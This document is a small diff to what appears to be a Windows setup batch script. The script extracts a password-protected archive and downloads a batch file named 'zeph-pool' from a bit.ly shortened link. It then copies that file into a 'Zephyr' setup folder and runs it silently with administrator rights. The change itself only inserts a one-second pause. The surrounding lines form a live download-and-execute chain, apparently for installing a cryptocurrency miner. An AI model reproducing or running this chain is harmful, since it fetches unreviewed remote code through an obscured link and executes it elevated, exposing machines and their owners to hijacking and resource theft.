@@ -13,5 +13,6 @@ powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2mine
 powershell -NoProfile -Command "Start-Sleep -Seconds 8"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/zeph-pool -OutFile C:\zeph-pool.bat"
 powershell -NoProfile -Command "Copy-Item -Path C:\zeph-pool.bat -Destination C:\Setup\Zephyr\zeph-pool.bat -Force"
+powershell -NoProfile -Command "Start-Sleep -Seconds 1"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
 exit
